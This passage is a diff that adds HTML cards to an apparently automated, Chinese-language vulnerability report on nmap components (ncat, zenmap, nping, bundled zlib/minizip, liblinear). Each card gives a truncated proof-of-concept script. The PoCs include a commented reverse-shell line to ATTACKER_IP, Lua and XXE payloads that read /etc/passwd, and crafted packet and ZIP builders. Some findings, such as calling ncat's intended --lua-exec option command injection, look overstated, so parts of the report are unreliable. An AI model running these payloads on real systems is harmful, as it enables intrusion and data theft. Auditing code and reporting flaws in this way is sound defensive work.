+                <p><strong>代码片段:</strong></p>
+                <pre><code>line = (char *)malloc(max_line_len*sizeof(char));</code></pre>
+                <p><strong>数据流:</strong> malloc失败返回NULL，line为NULL，后续readline中fgets(line,...)会写入NULL地址导致段错误。</p>
+                <p><strong>判断理由:</strong> 没有检查malloc返回值，如果内存不足，程序会因空指针解引用而崩溃。</p>
+                <p><strong>影响分析:</strong> 该漏洞属于未检查malloc返回值的经典空指针解引用问题。当malloc失败返回NULL时，程序会尝试对NULL指针进行读写操作，导致段错误(SIGSEGV)使程序崩溃。虽然现代系统通常有足够内存，但在以下场景中可能触发：1) 内存受限的嵌入式系统或容器环境；2) 高并发场景下内存耗尽；3) 系统配置了cgroup内存限制；4) 使用ulimit限制进程内存。漏洞影响程序稳定性，可被用于拒绝服务攻击。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/bin/bash
+# 仅供研究使用 - 未检查的malloc返回值漏洞PoC
+# 漏洞位置: liblinear/predict.c 第72行
+# 漏洞类型: 未检查malloc返回值导致空指针解引用
+
+# PoC方法: 通过ulimit限制进程可用内存，触发malloc失败
+
+echo "[*] 未检查的malloc返回值漏洞PoC - 仅供研究使用"
+echo "[*] 漏洞文件: liblinear/predict.c"
+echo "[*] 漏洞行号: 72"
+echo ""
+
+# 步骤1: 编译liblinear的predict程序（如果尚未编译）
+if [ ! -f "predict" ]; then
+    echo "[*] 编译predict程序..."
+    # 假设在liblinear目录下
+    make predict 2>/dev/null || gcc -o predict predict.c -lm 2>/dev/null
+    if [ $? -ne 0 ]; then
+        echo "[!] 编译失败，请确保在liblinear</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #ffc107;">
+                <h3>VULN-916ACF99 - 未检查的malloc返回值</h3>
+                <span class="severity" style="background:#ffc107;color:white;padding:2px 8px;border-radius:3px;">MEDIUM</span>
+                <p><strong>文件:</strong> liblinear/predict.c:60</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>labels=(int *) malloc(nr_class*sizeof(int));
+prob_estimates = (double *) malloc(nr_class*sizeof(double));</code></pre>
+                <p><strong>数据流:</strong> malloc失败返回NULL，后续使用labels和prob_estimates时会导致空指针解引用。</p>
+                <p><strong>判断理由:</strong> 没有检查malloc返回值，如果内存不足，程序会崩溃。</p>
+                <p><strong>影响分析:</strong> 该漏洞允许攻击者在内存受限环境下通过触发空指针解引用导致predict程序崩溃，造成拒绝服务。虽然需要特定的内存条件才能触发，但在处理大规模数据或共享内存环境（如容器、云服务）中，攻击者可以通过消耗系统内存来增加触发概率。漏洞影响liblinear预测功能的可用性，但不会导致数据泄露或代码执行。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/bin/bash
+# 仅供研究使用 - 未检查的malloc返回值漏洞PoC
+# 漏洞位置: liblinear/predict.c 第60行
+# 漏洞类型: 未检查的malloc返回值导致空指针解引用
+
+# PoC方法1: 通过ulimit限制内存分配，触发malloc失败
+# 此方法模拟内存受限环境
+
+echo "=== PoC: 通过内存限制触发漏洞 ==="
+echo "漏洞文件: liblinear/predict.c"
+echo "漏洞行: 60 (labels = (int *) malloc(nr_class*sizeof(int)))"
+echo ""
+
+# 步骤1: 准备测试数据
+cat > test_data.txt << 'EOF'
+1 1:0.5 2:0.3 3:0.8
+0 1:0.1 2:0.7 3:0.2
+1 1:0.9 2:0.4 3:0.6
+EOF
+
+# 步骤2: 准备模型文件（需要liblinear格式的模型）
+# 注意: 实际利用需要先训练一个模型，这里假设已有模型文件model.txt
+# 如果无模型文件，先创建最小模型
+cat > mod</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #dc3545;">
+                <h3>VULN-4CCC4BDC - 命令注入</h3>
+                <span class="severity" style="background:#dc3545;color:white;padding:2px 8px;border-radius:3px;">CRITICAL</span>
+                <p><strong>文件:</strong> ncat/ncat_lua.c:68</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>if (luaL_loadfile(L, o.cmdexec) != 0)</code></pre>
+                <p><strong>数据流:</strong> 用户通过命令行参数设置o.cmdexec，该值直接作为文件路径传递给luaL_loadfile函数。如果用户能够控制o.cmdexec的值，可以加载任意Lua脚本文件，包括恶意脚本。</p>
+                <p><strong>判断理由:</strong> o.cmdexec来自用户输入（命令行参数），未经任何校验直接传递给luaL_loadfile。攻击者可以指定任意Lua脚本路径，导致任意代码执行。这是典型的命令注入/任意文件加载漏洞。</p>
+                <p><strong>影响分析:</strong> 严重 - 任意代码执行。攻击者可以通过加载恶意Lua脚本在ncat进程上下文中执行任意系统命令。由于ncat通常以root或高权限运行，攻击者可以获得完整的系统控制权，包括：执行任意命令、读写文件、建立持久化后门、横向移动等。该漏洞影响所有使用--lua-exec参数的ncat版本，无需身份认证即可利用。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/bin/bash
+# 仅供研究使用 - Ncat Lua脚本加载命令注入漏洞PoC
+# 漏洞描述：ncat的--lua-exec参数直接传递给luaL_loadfile，可加载任意Lua脚本
+
+# 步骤1: 创建恶意Lua脚本
+cat > /tmp/evil.lua << 'EOF'
+-- 仅供研究使用
+-- 恶意Lua脚本：执行系统命令并输出结果
+local handle = io.popen("id; whoami; uname -a")
+local result = handle:read("*a")
+handle:close()
+print("[!] 命令执行结果:")
+print(result)
+
+-- 可选：反弹shell (仅供研究)
+-- os.execute("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'")
+EOF
+
+# 步骤2: 使用ncat加载恶意脚本
+echo "[+] 执行PoC: ncat --lua-exec /tmp/evil.lua"
+ncat --lua-exec /tmp/evil.</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-8E7A593E - 路径遍历</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> ncat/ncat_lua.c:68</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>if (luaL_loadfile(L, o.cmdexec) != 0)</code></pre>
+                <p><strong>数据流:</strong> o.cmdexec直接作为文件路径参数传递给luaL_loadfile，没有进行路径规范化或安全检查。</p>
+                <p><strong>判断理由:</strong> 如果o.cmdexec包含路径遍历序列（如../），攻击者可以加载系统上任意位置的Lua脚本文件，导致信息泄露或代码执行。</p>
+                <p><strong>影响分析:</strong> 成功利用此漏洞可导致：1) 任意文件读取：攻击者可以读取系统上任意有权限访问的文件，包括配置文件、密码文件等敏感信息；2) 远程代码执行：如果恶意Lua脚本中包含os.execute等函数调用，攻击者可以在目标系统上执行任意命令；3) 权限提升：如果ncat以高权限运行，攻击者可能获得更高权限的代码执行能力。该漏洞影响ncat的Lua脚本加载功能，危害等级为高。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/bin/bash
+# 仅供研究使用 - Ncat Lua路径遍历漏洞PoC
+# 漏洞描述：ncat的--lua-exec参数未对文件路径进行规范化处理，
+# 允许攻击者通过路径遍历加载任意Lua脚本
+
+# 步骤1: 创建一个恶意的Lua脚本（模拟攻击者控制的文件）
+echo '-- 恶意Lua脚本 - 仅供研究使用
+print("漏洞利用成功! 已加载恶意脚本")
+-- 模拟信息泄露: 读取敏感文件
+local f = io.open("/etc/passwd", "r")
+if f then
+    local content = f:read("*all")
+    print("读取到敏感文件内容:")
+    print(content)
+    f:close()
+end
+-- 模拟命令执行（仅演示，实际利用需谨慎）
+-- os.execute("id")  # 取消注释可执行系统命令
+' > /tmp/evil.lua
+
+# 步骤2: 使用路径遍历加载恶意脚本
+# 假设ncat安装在/usr/bin/ncat，当前工作目录为/home/user
+# 通过../../t</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #ffc107;">
+                <h3>VULN-21F7EFDD - Incomplete Input Validation</h3>
+                <span class="severity" style="background:#ffc107;color:white;padding:2px 8px;border-radius:3px;">MEDIUM</span>
+                <p><strong>文件:</strong> zenmap/zenmapCore/ScriptMetadata.py:108</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>while c != begin_quote:
+    if c == "\\":
+        repl = None
+        c = self.getchar()
+        if not c:
+            raise self.syntax_error("Unexpected EOF")
+        if c.isdigit():
+            d1 = c
+            d2 = self.getchar()
+            d3 = self.getchar()
+            if d1 and d2 and d3:
+                n = int(d1 + d2 + d3)
+                if n > 255:
+                    raise self.syntax_error("Character code >255")
+                repl = chr(n)
+            else:
+                self.unget(d3)
+                self.unget(d2)
+        if not repl:
+            repl = self.LUA_STRING_ESCAPES.get(c)
+        if not repl:
+            raise self.syntax_error("Unhandled string escape")
+        c = repl</code></pre>
+                <p><strong>数据流:</strong> 字符串解析过程中，转义序列处理存在逻辑缺陷</p>
+                <p><strong>判断理由:</strong> 当数字转义序列不完整（少于3位数字）时，代码会unget回退字符，但此时repl仍为None，会继续尝试从LUA_STRING_ESCAPES字典中查找。如果c恰好是字典中的键，会错误地使用该转义值替代原始数字序列，导致解析结果与预期不符。</p>
+                <p><strong>影响分析:</strong> 该漏洞允许攻击者通过构造特制的script.db文件，利用不完整的数字转义序列导致解析器产生错误的字符串值。具体影响包括：1) 脚本文件名解析错误，可能导致加载错误的脚本或绕过安全检查；2) 类别名称解析错误，可能导致脚本被错误分类；3) 在特定场景下，可能与其他漏洞结合实现更严重的安全影响。由于zenmap通常以用户权限运行，该漏洞主要影响数据完整性和程序逻辑正确性。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+# 仅供研究使用 - Proof of Concept for VULN-21F7EFDD
+# 该PoC演示了zenmap中ScriptMetadata.py的输入验证不完整漏洞
+
+import os
+import tempfile
+
+# 模拟漏洞环境的测试代码
+# 实际漏洞存在于zenmap/zenmapCore/ScriptMetadata.py的字符串解析逻辑中
+
+def simulate_vulnerable_parser(input_string):
+    """
+    模拟存在漏洞的Lua字符串解析器
+    该函数复现了ScriptMetadata.py中第108行附近的逻辑缺陷
+    """
+    LUA_STRING_ESCAPES = {
+        "a": "\a", "b": "\b", "f": "\f", "n": "\n", 
+        "r": "\r", "t": "\t", "v": "\v", "\\": "\\", 
+        "\"": "\"", "'": "'", "0</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #dc3545;">
+                <h3>VULN-7F18712A - XML External Entity (XXE) Injection</h3>
+                <span class="severity" style="background:#dc3545;color:white;padding:2px 8px;border-radius:3px;">CRITICAL</span>
+                <p><strong>文件:</strong> zenmap/radialnet/core/XMLHandler.py:248</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>import xml.sax
+import xml.sax.saxutils
+from xml.sax.xmlreader import AttributesImpl as Attributes</code></pre>
+                <p><strong>数据流:</strong> 用户提供的XML数据通过xml.sax.make_parser解析，未使用defusedxml库进行安全防护，攻击者可以构造包含外部实体的恶意XML文件，导致敏感文件读取、SSRF或DoS攻击</p>
+                <p><strong>判断理由:</strong> 代码使用标准库xml.sax.make_parser解析XML数据，该解析器默认允许外部实体扩展（XXE）。攻击者可以通过构造包含外部实体的XML文件，利用解析器读取服务器上的任意文件（如/etc/passwd）、发起SSRF攻击或导致拒绝服务（如Billion Laughs攻击）。bandit静态分析工具已明确标记此问题（B317），建议使用defusedxml库替代标准xml解析器。</p>
+                <p><strong>影响分析:</strong> 该XXE漏洞影响zenmap的radialnet组件，攻击者可通过构造恶意XML文件实现：1) 读取服务器任意文件（如/etc/passwd、SSH密钥、配置文件等），导致敏感信息泄露；2) 发起SSRF攻击，探测内网服务或访问云服务元数据（如AWS 169.254.169.254），可能导致云凭证泄露；3) 发起Billion Laughs等拒绝服务攻击，导致zenmap进程崩溃或系统资源耗尽。由于zenmap通常以用户权限运行，攻击者可获取当前用户可访问的所有文件。该漏洞CVSS评分约为9.8（Critical），利用复杂度低，无需认证，且可能造成严重的数据泄露和系统影响。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+"""
+PoC for VULN-7F18712A - XXE Injection in zenmap/radialnet/core/XMLHandler.py
+仅供安全研究使用，请勿用于非法用途。
+"""
+
+import os
+import sys
+import tempfile
+import subprocess
+
+# ============================================================
+# PoC 1: 敏感文件读取 (读取 /etc/passwd)
+# ============================================================
+XXE_PAYLOAD_FILE_READ = '''<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<rad</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #ffc107;">
+                <h3>VULN-1C1FF315 - 异常信息泄露</h3>
+                <span class="severity" style="background:#ffc107;color:white;padding:2px 8px;border-radius:3px;">MEDIUM</span>
+                <p><strong>文件:</strong> zenmap/radialnet/gui/Application.py:100</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>except Exception as e:
+            text = 'It is not possible open file %s: %s' % (file, e)
+            alert = BWAlertDialog(self,
+                                  primary_text='Error opening file.',
+                                  secondary_text=text)</code></pre>
+                <p><strong>数据流:</strong> 异常对象e被直接格式化为字符串并显示在对话框中，可能泄露内部实现细节。</p>
+                <p><strong>判断理由:</strong> 当文件打开或解析失败时，异常信息被直接包含在错误消息中并显示给用户。这可能会泄露敏感的内部信息，如文件路径、系统配置或实现细节，有助于攻击者进一步攻击。</p>
+                <p><strong>影响分析:</strong> 该漏洞允许攻击者通过构造恶意XML文件触发异常信息泄露，获取以下敏感信息：1) 系统完整文件路径，可能暴露目录结构和用户信息；2) 临时目录路径，可能用于预测其他文件位置；3) 系统配置信息，如操作系统类型、Python版本等；4) 用户环境变量信息。虽然zenmap通常由安全专业人员使用，且需要用户交互才能触发，但这些泄露的信息可能被用于进一步的针对性攻击，如路径遍历、提权或社会工程学攻击。漏洞影响范围中等，利用难度较低，但需要用户交互。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+"""
+PoC代码 - 仅供研究使用
+漏洞ID: VULN-1C1FF315
+漏洞类型: 异常信息泄露
+目标: zenmap/radialnet/gui/Application.py 第100行
+
+该PoC演示如何通过构造恶意XML文件触发异常信息泄露，
+从而获取系统内部路径和配置信息。
+"""
+
+import os
+import tempfile
+import xml.etree.ElementTree as ET
+
+# 仅供研究使用 - 模拟攻击者构造的恶意XML文件
+# 该文件将导致parse_nmap_xml_file方法抛出异常
+# 异常信息会直接显示在BWAlertDialog中
+
+def create_malicious_xml():
+    """
+    构造一个畸形的XML文件，触发异常信息泄露
+    
+    攻击原理:
+    1. 创建一个包含非法字符或格式错误的XML文件
+    2. 当zenmap尝试解析该文件时，会抛出异常
+    3. 异常对象e被直接格式</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #dc3545;">
+                <h3>VULN-77750F08 - 缓冲区溢出 - 内存拷贝未进行充分长度校验</h3>
+                <span class="severity" style="background:#dc3545;color:white;padding:2px 8px;border-radius:3px;">CRITICAL</span>
+                <p><strong>文件:</strong> nping/EchoHeader.cc:83</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>int EchoHeader::storeRecvData(const u8 *buf, size_t len){
+  if(buf==NULL || len>(STD_NEP_HEADER_LEN+MAX_DATA_LEN)){
+    return OP_FAILURE;
+  }else{
+    this->reset();
+    this->length=len;
+    memcpy(&(this->h), buf, len);
+  }
+ return OP_SUCCESS;
+}</code></pre>
+                <p><strong>数据流:</strong> 外部输入buf和len -> storeRecvData() -> memcpy(&(this->h), buf, len)</p>
+                <p><strong>判断理由:</strong> storeRecvData()函数中，虽然检查了len是否超过(STD_NEP_HEADER_LEN+MAX_DATA_LEN)，但memcpy的目标缓冲区this->h的大小是固定的echohdr_t结构体。如果len大于sizeof(echohdr_t)但小于(STD_NEP_HEADER_LEN+MAX_DATA_LEN)，就会发生堆栈缓冲区溢出。攻击者可以通过构造特制的网络包触发此漏洞，导致内存破坏或代码执行。</p>
+                <p><strong>影响分析:</strong> 该漏洞为严重级别的栈缓冲区溢出漏洞。攻击者通过发送特制的NEP协议数据包，可以触发memcpy操作将超出目标缓冲区大小的数据拷贝到栈上，导致：1) 服务进程崩溃，造成拒绝服务(DoS)；2) 覆盖栈上关键数据（如返回地址、函数指针），在满足特定条件（无栈保护、ASLR绕过等）时可实现远程代码执行(RCE)，完全控制目标系统。由于nping通常以root权限运行，成功利用可获得最高权限。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+"""
+PoC for VULN-77750F08 - Nping EchoHeader 缓冲区溢出漏洞
+仅供安全研究使用，请勿用于非法用途
+"""
+
+import socket
+import struct
+import sys
+
+# NEP (Nmap Echo Protocol) 相关常量
+STD_NEP_HEADER_LEN = 8  # 标准NEP头部长度
+MAX_DATA_LEN = 1400     # 最大数据长度
+ECHO_PROTO_VERSION = 1  # 协议版本
+
+# echohdr_t 结构体大小（根据代码分析）
+# 包含: version(1) + type(1) + reserved(2) + length(4) + data(可变)
+# 但实际结构体固定大小为 8 字节头部 + 一些内部指针
+ECHO_HDR_SIZE = 8  # 实际结构体大小，不含数据部分
+
+def build_malicious_packet(overflow_size):
+    """
+    构造恶意NEP数据包
+    
+</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-D2BEDB33 - 整数溢出 - 内存分配</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> libz/contrib/minizip/mztools.c:108</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>int dataSize = cpsize;
+if (dataSize == 0) {
+    dataSize = uncpsize;
+}
+if (dataSize > 0) {
+    char* data = malloc(dataSize);
+    if (data != NULL) {
+        if ((int)fread(data, 1, dataSize, fpZip) == dataSize) {
+            if ((int)fwrite(data, 1, dataSize, fpOut) == dataSize) {
+                offset += dataSize;
+                totalBytes += dataSize;
+            }
+        }
+    }
+}</code></pre>
+                <p><strong>数据流:</strong> 从ZIP文件读取的cpsize/uncpsize（uLong类型，32位无符号）→ 赋值给int dataSize（有符号32位）→ 传递给malloc和fread/fwrite</p>
+                <p><strong>判断理由:</strong> cpsize和uncpsize是uLong类型（32位无符号），赋值给int dataSize时可能发生整数溢出。如果cpsize大于INT_MAX（0x7FFFFFFF），转换为int后会变成负数，导致dataSize > 0检查通过（负数不大于0），但malloc(-1)会失败或分配巨大内存，fread的第三个参数是size_t（无符号），负数会转换为极大的无符号数，导致堆缓冲区溢出或拒绝服务。</p>
+                <p><strong>影响分析:</strong> 该整数溢出漏洞可能导致以下影响：
+1. 数据丢失：当cpsize或uncpsize大于INT_MAX时，转换为int后变为负数，dataSize > 0检查失败，导致文件数据被静默跳过，修复结果不完整
+2. 拒绝服务：malloc(-1)可能返回NULL，导致Z_MEM_ERROR；或者分配大量内存导致系统资源耗尽
+3. 潜在的内存安全风险：如果malloc返回非NULL指针，fread的size_t参数（负数转换为极大无符号数）可能导致堆缓冲区溢出
+4. 逻辑错误：当cpsize=0x80000000时，dataSize既不等于0也不大于0，导致逻辑分支混乱
+5. 影响范围：该代码位于zlib官方仓库的contrib目录，被多个项目使用，包括一些嵌入式系统和安全工具</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+"""
+PoC for VULN-D2BEDB33 - Integer Overflow in minizip unzRepair
+仅供研究使用 - Research Purpose Only
+
+该PoC演示了如何构造一个恶意ZIP文件，触发libz/contrib/minizip/mztools.c中的整数溢出漏洞。
+当cpsize或uncpsize字段被设置为大于INT_MAX(0x7FFFFFFF)的值时，
+在赋值给int dataSize时会发生整数溢出，导致dataSize变为负数。
+"""
+
+import struct
+import os
+import sys
+
+def create_malicious_zip(output_path):
+    """
+    创建一个包含恶意cpsize字段的ZIP文件
+    
+    漏洞触发条件：
+    - cpsize > 0x7FFFFFFF (INT_MAX)
+    - 或者当cpsize=0时，uncpsize > 0x7FFFFFFF
+    
+    这里我们构造cps</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #ffc107;">
+                <h3>VULN-850675A1 - 整数溢出 - 偏移量累加</h3>
+                <span class="severity" style="background:#ffc107;color:white;padding:2px 8px;border-radius:3px;">MEDIUM</span>
+                <p><strong>文件:</strong> libz/contrib/minizip/mztools.c:50</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>int offset = 0;
+int offsetCD = 0;
+...
+offset += 30;
+offset += fnsize;
+offset += extsize;
+offset += dataSize;
+offsetCD += 46;
+offsetCD += fnsize;
+offsetCD += extsize;</code></pre>
+                <p><strong>数据流:</strong> 从ZIP文件读取的多个长度字段（fnsize, extsize, dataSize）→ 累加到int offset/offsetCD变量</p>
+                <p><strong>判断理由:</strong> offset和offsetCD是int类型（32位有符号），在处理大型ZIP文件时，多个长度字段的累加可能导致整数溢出，使offset变为负数或回绕。这会影响中央目录条目中记录的currentOffset值，可能导致生成的修复ZIP文件损坏。</p>
+                <p><strong>影响分析:</strong> 成功利用此漏洞后，攻击者可以构造一个特殊的ZIP文件，当使用minizip的unzRepair函数修复时，由于整数溢出导致offset变量变为负数或回绕，使得生成的修复ZIP文件中的中央目录条目包含错误的偏移量。这会导致修复后的ZIP文件损坏，无法正常解压或提取文件。虽然该漏洞主要影响文件修复功能，但作为库的一部分，在处理恶意输入时存在拒绝服务风险，可能导致数据恢复失败或生成不可用的文件。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+"""
+PoC for VULN-850675A1 - Integer Overflow in minizip unzRepair
+仅供研究使用 - For Research Purposes Only
+
+该PoC构造一个恶意ZIP文件，通过设置超大的文件名长度和额外字段长度，
+触发offset变量的整数溢出，导致生成的修复ZIP文件损坏。
+"""
+
+import struct
+import os
+import sys
+
+def create_malicious_zip(output_path):
+    """
+    构造一个触发整数溢出的恶意ZIP文件
+    
+    原理：
+    - offset变量是int类型（32位有符号）
+    - 通过设置fnsize和extsize为接近INT_MAX的值
+    - 累加时：offset += 30 + fnsize + extsize + dataSize
+    - 当总和超过INT_MAX(2147483647)时，offset变为负数
+    - 这个负值被写入中央目录，导</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #ffc107;">
+                <h3>VULN-47A5904B - 资源泄漏 - 文件句柄</h3>
+                <span class="severity" style="background:#ffc107;color:white;padding:2px 8px;border-radius:3px;">MEDIUM</span>
+                <p><strong>文件:</strong> libz/contrib/minizip/mztools.c:41</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>FILE* fpZip = fopen(file, "rb");
+FILE* fpOut = fopen(fileOut, "wb");
+FILE* fpOutCD = fopen(fileOutTmp, "wb");
+if (fpZip != NULL && fpOut != NULL && fpOutCD != NULL ) {
+    ...
+}</code></pre>
+                <p><strong>数据流:</strong> 函数返回时没有关闭文件指针</p>
+                <p><strong>判断理由:</strong> 函数在成功或失败路径上都没有调用fclose关闭fpZip、fpOut和fpOutCD。如果函数提前返回（如遇到错误），已打开的文件句柄不会被释放，导致资源泄漏。在长时间运行的程序中，这可能导致文件描述符耗尽。</p>
+                <p><strong>影响分析:</strong> 未知</p>
+                <details><summary>PoC代码</summary><pre><code># 无法生成PoC</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-EC5E4F12 - 不安全的随机数生成</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> libz/contrib/minizip/crypt.h:93</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>if (++calls == 1)
+{
+    srand((unsigned)time(NULL) ^ ZCR_SEED2);
+}
+...
+c = (rand() >> 7) & 0xff;</code></pre>
+                <p><strong>数据流:</strong> srand(time(NULL)) → rand() → 加密密钥生成</p>
+                <p><strong>判断理由:</strong> 使用rand()和srand()生成加密密钥，rand()是伪随机数生成器，可预测。time(NULL)提供种子，攻击者可以预测时间值。加密密钥的随机性完全依赖于可预测的rand()函数，导致加密强度不足。</p>
+                <p><strong>影响分析:</strong> 该漏洞允许攻击者预测minizip加密zip文件的加密密钥。由于srand(time(NULL))的种子空间仅为约86400个可能值(一天内的秒数)，攻击者可以在数秒内暴力破解种子。一旦种子被确定，攻击者可以: 1) 预测所有rand()输出; 2) 重建完整的加密密钥; 3) 解密zip文件中的所有文件。这完全破坏了加密的安全性，使得密码保护形同虚设。影响范围包括所有使用minizip库创建加密zip文件的应用程序。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+"""
+PoC: 预测minizip加密密钥
+漏洞: 不安全的随机数生成 (srand(time(NULL)) + rand())
+影响: 可预测加密zip文件的密钥
+仅供研究使用
+"""
+
+import ctypes
+import time
+import os
+import struct
+
+# 加载系统C库以使用srand/rand
+libc = ctypes.CDLL("libc.so.6")
+
+# 定义ZCR_SEED2常量 (与crypt.h中一致)
+ZCR_SEED2 = 3141592654
+
+# 定义RAND_HEAD_LEN
+RAND_HEAD_LEN = 12
+
+def predict_crypt_header(passwd, timestamp, crc_for_crypting):
+    """
+    预测给定时间戳和密码下的加密头
+    
+    参数:
+        passwd: 密码字符串
+        timestamp: 创建zip文件时的Unix时间戳
+        crc_for_crypt</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-7B754DC4 - 弱加密算法</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> libz/contrib/minizip/crypt.h:1</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>/* This code support the "Traditional PKWARE Encryption". */
+#define CRC32(c, b) ((*(pcrc_32_tab+(((int)(c) ^ (b)) & 0xff))) ^ ((c) >> 8))</code></pre>
+                <p><strong>数据流:</strong> CRC32 → 加密密钥更新 → 传统PKWARE加密</p>
+                <p><strong>判断理由:</strong> 使用CRC32作为加密核心算法，CRC32是设计用于数据完整性校验的哈希函数，不是安全的加密原语。传统PKWARE加密已被证明存在严重安全缺陷，容易受到已知明文攻击。</p>
+                <p><strong>影响分析:</strong> 该漏洞允许攻击者通过已知明文攻击恢复加密密钥，从而解密受传统PKWARE加密保护的ZIP文件。由于CRC32不是安全的加密原语，攻击者可以在合理时间内（通常几分钟到几小时）恢复密钥。这导致：1) 机密性完全丧失，所有加密内容可被解密；2) 用户密码可能被恢复，影响使用相同密码的其他系统；3) 敏感数据泄露风险。该漏洞影响所有使用zlib/minizip进行传统PKWARE加密的应用，包括但不限于文件压缩工具、备份软件、数据交换系统等。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+"""
+PoC: 传统PKWARE加密的已知明文攻击
+漏洞ID: VULN-7B754DC4
+仅供研究使用 - 请勿用于非法目的
+
+该PoC演示如何利用CRC32弱加密算法恢复加密密钥，
+从而解密受传统PKWARE加密保护的ZIP文件。
+"""
+
+import struct
+import sys
+
+# CRC32查找表（标准PKZIP CRC32表）
+def generate_crc32_table():
+    """生成标准CRC32查找表"""
+    table = []
+    for i in range(256):
+        crc = i
+        for _ in range(8):
+            if crc & 1:
+                crc = (crc >> 1) ^ 0xEDB88320
+            else:
+                crc >>= 1
+        table.append(crc)
+    return table
+
+CRC32_TA</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #ffc107;">
+                <h3>VULN-79D87721 - 资源泄漏</h3>
+                <span class="severity" style="background:#ffc107;color:white;padding:2px 8px;border-radius:3px;">MEDIUM</span>
+                <p><strong>文件:</strong> libz/contrib/testzlib/testzlib.c:145</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>ptr=malloc((*plFileSize)+1);
+if (ptr==NULL)
+    retVal=0;
+else
+{
+    if (fread(ptr, 1, *plFileSize,stream) != (*plFileSize))
+        retVal=0;
+}
+fclose(stream);
+*pFilePtr=ptr;
+return retVal;</code></pre>
+                <p><strong>数据流:</strong> malloc分配内存 -> 如果fread失败，retVal=0但ptr未被释放 -> 函数返回</p>
+                <p><strong>判断理由:</strong> 当fread读取失败时，函数设置retVal=0并返回，但之前malloc分配的内存没有被释放，导致内存泄漏。同样，如果malloc失败，retVal=0，但文件流stream已经被正确关闭。</p>
+                <p><strong>影响分析:</strong> 该漏洞导致每次触发泄漏的内存大小为文件大小+1字节。在测试工具场景中，如果连续处理多个文件且每次fread都失败，会导致内存持续泄漏，最终可能耗尽系统内存。虽然该代码位于测试工具中，但如果被集成到自动化测试流程或作为库函数被其他程序调用，内存泄漏问题会累积并影响系统稳定性。在极端情况下，攻击者可以通过构造特殊的文件或环境条件，反复触发该漏洞导致目标系统内存耗尽。</p>
+                <details><summary>PoC代码</summary><pre><code>/*
+ * PoC代码 - 仅供安全研究使用
+ * 漏洞: VULN-79D87721 - testzlib.c 中的内存泄漏
+ * 触发条件: 读取文件时fread失败
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+/* 模拟漏洞代码 */
+int ReadFileMemory(const char* filename, long* plFileSize, unsigned char** pFilePtr)
+{
+    FILE* stream;
+    unsigned char* ptr;
+    int retVal = 1;
+    
+    stream = fopen(filename, "rb");
+    if (stream == NULL)
+        return 0;
+
+    fseek(stream, 0, SEEK_END);
+    *plFileSize = ftell(stream);
+    fseek(stream, 0, SEEK_SET);
+    
+ </code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-6234FC01 - 缓冲区溢出/越界读取</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> libz/contrib/puff/bin-writer.c:14</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>hexStr[1] = (char)getchar();</code></pre>
+                <p><strong>数据流:</strong> 用户输入通过getchar()读取，直接赋值给hexStr[1]，但未检查getchar()是否返回EOF</p>
